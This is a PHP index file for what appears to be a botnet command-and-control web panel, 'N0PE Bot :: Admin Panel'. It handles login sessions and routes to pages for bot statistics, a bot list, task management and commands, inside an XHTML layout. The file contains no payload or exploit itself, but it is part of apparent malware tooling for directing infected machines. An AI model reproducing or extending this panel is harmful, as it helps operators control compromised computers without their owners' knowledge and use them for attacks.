<?php
	include('../system/global.php');
	include('../system/session.class.php');
	include('templates/frm_login.php');
	include('templates/frm_statistic.php');
	include('templates/frm_botlist.php');
	include('templates/frm_tasks.php');
	include('templates/frm_logout.php');
	include('templates/mod_commands.php');
	
	$cPage = NULL;
	$rPage = $_GET['q'];
	$Session = new Session();
	$rSession = $Session->checkSession();
	
	if(!$rPage) { $cPage = new template_Statistic(); }
	elseif($rPage == "statistic") { $cPage = new template_Statistic(); }
	elseif($rPage == "bots") { $cPage = new template_Bots(); }
	elseif($rPage == "tasks") { $cPage = new template_Tasks(); }
	elseif($rPage == "logout") { $cPage = new template_Logout(); }
	
	if($rSession == false) { $cPage = new template_Login(); }
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<link rel="stylesheet" href="resources/css/style.css" type="text/css" />
		<title>N0PE Bot :: Admin Panel</title>
	</head>
	<body onload="resize();" >
		<div id="container">
			<table>
				<tr>
					<tr>
						<th id="Middle_Box" style="height:10px;"></th>
						<th id="Middle_Box" style="height:10px;"></th>
						<th id="Middle_Box" style="height:10px;"></th>
					</tr>
					<tr id="Box_Middle" class="Box_Middle">
						<th id="Main_Left_Box"></th>
						<th id="Main_Middle_Box">
							<div style="margin:10px;"></div>
							<center>
								<img src="resources/images/logo.png">
								<div id="banner_subtext">exclusive Version by w!cked&reg;</div>
								<div id="navigation">
								<?php
									if($rSession)
									{
										echo '<a href="?q=statistic">Statistic</a>';
										echo '<a href="?q=bots">Bot List</a>';
										echo '<a href="?q=tasks">Task Management</a>';
										echo '<a href="?q=logout">Logout</a>';
									} else {
										echo '<b>Standby</b>';
									}
								?>
								</div>
							</center>
						</th>
						<th id="Main_Right_Box"></th>
					</tr>
					<tr>
						<th id="Middle_Box" style="height:10px;"></th>
						<th id="Middle_Box" style="height:10px;"></th>
						<th id="Middle_Box" style="height:10px;"></th>
					</tr>
				</tr>
			</table>
			<br />
			<table>
				<tr>
					<tr>
						<th id="Left_Box"></th>
						<th id="Middle_Box" class="Middle_Box"><?php echo $cPage->getTitle(); ?></th>
						<th id="Right_Box"></th>
					</tr>
					<tr id="Box_Middle" class="Box_Middle">
						<th id="Main_Left_Box"></th>
						<th id="Main_Middle_Box">
							<div style="margin:5px;"></div>
							<?php echo $cPage->getContent(); ?>
						</th>
						<th id="Main_Right_Box"></th>
					</tr>
					<tr>
						<th id="Main_Bottom_Box"></th>
						<th id="Main_Bottom_Box"></th>
						<th id="Main_Bottom_Box"></th>
					</tr>
				</tr>
			</table>
		</div>
	</body>
</html>